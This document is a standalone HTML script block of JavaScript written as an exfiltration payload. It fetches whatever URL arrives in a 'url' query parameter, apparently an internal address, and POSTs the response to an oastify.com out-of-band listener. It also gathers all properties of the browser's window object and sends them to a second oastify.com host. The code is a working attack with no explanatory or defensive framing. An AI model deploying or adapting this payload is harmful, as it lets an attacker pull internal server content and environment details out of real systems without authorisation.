
        <script>


// Function to get URL parameters
function getQueryParam(param) {
    var urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}

// Function to make the XHR request
function sendRequest() {
    // Get the localUrl parameter from the URL
    var localUrl = getQueryParam('url');

    if (!localUrl) {
        console.error('Error: localUrl parameter is missing in the URL');
        sendPingWithError('localUrl parameter is missing in the URL');
        return;
    }

    // Create a new XMLHttpRequest object
    var xhr = new XMLHttpRequest();
    
    // Configure it: GET-request for the URL
    xhr.open('GET', localUrl, true);

    // Disable sending credentials with the request
    xhr.withCredentials = false;

    // Define what happens on successful data submission
    xhr.onload = function () {
        if (xhr.status >= 200 && xhr.status < 400) {
            // Success! Send the response to the external server
            sendToExternalServer(xhr.responseText);
        } else {
            console.error('Error: Failed to retrieve data from the local server');
            sendPingWithError(`Failed to retrieve data from local server with status: ${xhr.status} and status text: ${xhr.statusText}`);
        }
    };

    // Define what happens in case of error
    xhr.onerror = function () {
        console.error('Request failed');
        sendPingWithError(`Request to local server failed with status: ${xhr.status} and status text: ${xhr.statusText}`);
    };

    // Send the request to the local server
    xhr.send();
}

// Function to send the response data to the external server
function sendToExternalServer(data) {
    var xhr = new XMLHttpRequest();

    // Configure it: POST-request for the URL
    xhr.open('POST', 'https://wzzzdi6z1x5071fu9b3skvww5nbezin7.oastify.com', true);

    // Disable sending credentials with the request
    xhr.withCredentials = false;

    xhr.setRequestHeader('Content-Type', 'application/json');

    // Define what happens on successful data submission
    xhr.onload = function () {
        if (xhr.status >= 200 && xhr.status < 400) {
            console.log('Success: Data sent to the external server');
        } else {
            console.error('Error: Failed to send data to the external server');
            sendPingWithError(`Failed to send data to external server with status: ${xhr.status} and status text: ${xhr.statusText}`);
        }
    };

    // Define what happens in case of error
    xhr.onerror = function () {
        console.error('Request failed');
        sendPingWithError(`Request to external server failed with status: ${xhr.status} and status text: ${xhr.statusText}`);
    };

    // Send the request with the data
    xhr.send(JSON.stringify({ content: data }));
}

// Function to send a ping with an error message
function sendPingWithError(errorMessage) {
    var xhr = new XMLHttpRequest();

    // Configure it: POST-request for the URL
    xhr.open('POST', 'https://wzzzdi6z1x5071fu9b3skvww5nbezin7.oastify.com', true);

    // Disable sending credentials with the request
    xhr.withCredentials = false;

    xhr.setRequestHeader('Content-Type', 'application/json');

    // Define what happens on successful data submission
    xhr.onload = function () {
        if (xhr.status >= 200 && xhr.status < 400) {
            console.log('Success: Error message sent to the external server');
        } else {
            console.error('Error: Failed to send error message to the external server');
        }
    };

    // Define what happens in case of error
    xhr.onerror = function () {
        console.error('Request failed');
    };

    // Send the request with the error message
    xhr.send(JSON.stringify({ error: errorMessage }));
}

// Call the function to initiate the requests
sendRequest();
// Function to get all properties and methods from the window object and its prototype chain
function getWindowProperties() {
    let result = {};

    function getAllProperties(obj, result) {
        let properties = Object.getOwnPropertyNames(obj);
        for (let i = 0; i < properties.length; i++) {
            let property = properties[i];
            if (!result.hasOwnProperty(property)) {
                try {
                    // Fetch the property value
                    let value = obj[property];
                    // Exclude certain properties or types (optional)
                    if (typeof value !== 'function') {
                        result[property] = value;
                    } else {
                        result[property] = '[Function]';
                    }
                } catch (e) {
                    result[property] = '[Error]';
                }
            }
        }

        // Recursively get properties from prototype chain
        let proto = Object.getPrototypeOf(obj);
        if (proto) {
            getAllProperties(proto, result);
        }
    }

    getAllProperties(window, result);
    return result;
}

// Function to send the properties list to a server
function sendProperties() {
    let properties = getWindowProperties();

    // Serialize properties to JSON
    let propertiesJSON = JSON.stringify(properties);

    // Send properties to a server (for example)
    fetch('https://iyklc45l0j4m6neg8x2ejhvi49a0y5mu.oastify.com', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: propertiesJSON,
    }).then(response => response.json())
      .then(data => console.log('Success:', data))
      .catch((error) => console.error('Error:', error));
}

// Call the function to send the properties list
sendProperties();


</script>
